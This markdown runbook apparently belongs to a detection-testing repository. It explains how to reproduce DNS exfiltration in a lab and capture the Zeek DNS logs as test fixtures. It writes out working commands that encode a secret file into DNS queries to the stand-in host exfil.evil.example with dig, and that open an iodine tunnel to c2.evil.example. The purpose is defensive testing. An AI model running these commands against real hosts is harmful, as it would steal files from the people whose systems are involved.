# Attack reproduction — DNS exfil (iodine / dnsteal)

Stand up an exfil-friendly DNS server on an attacker-controlled domain,
push a file from the victim using a DNS-exfil tool, and let Zeek record
the query burst. The detection in `../detection/` keys on raw subdomain
byte volume so it's qtype-agnostic.

## Prereqs

- Domain whose authoritative NS you control (or a fake local responder for
  pure-lab testing — see the dnscat2 case's `local_lab.md` (TODO, v0.2))
- Victim host on the lab subnet that Zeek is sniffing
- Lab compose stack running

## Run (high level — dnsteal)

```bash
# Server (attacker)
git clone https://github.com/m57/dnsteal && cd dnsteal
sudo python3 dnsteal.py 198.51.100.5 -z -s 4 -b 57 -f 17

# Victim — pipe a file out
dig +short \
  $(base32 -w 57 < /tmp/secret.txt | head -100 | tr -d "=" | sed "s/^/$(date +%s)./") \
  exfil.evil.example
```

## Run (high level — iodine)

```bash
# Server (attacker, on the authoritative NS host)
sudo iodined -c -P labsecret 192.168.99.1 c2.evil.example

# Victim
sudo iodine -P labsecret c2.evil.example
# Now route exfil traffic through tun0 / cat the file into nc over the tunnel
```

## Capture telemetry into a fixture

```bash
docker exec detlab-zeek cat /usr/local/zeek/logs/current/dns.log \
  | grep "exfil.evil.example" \
  > /tmp/dnsexfil_capture.log

head -600 /tmp/dnsexfil_capture.log > tests/positive_dns.log
```

## Safety / scope

- Lab use only.
- The synthetic `tests/positive_dns.log` shipped here is generated by
  `scripts/generate_fixtures.py` so the test suite passes without
  needing the lab — replace it with a real capture once you have one.
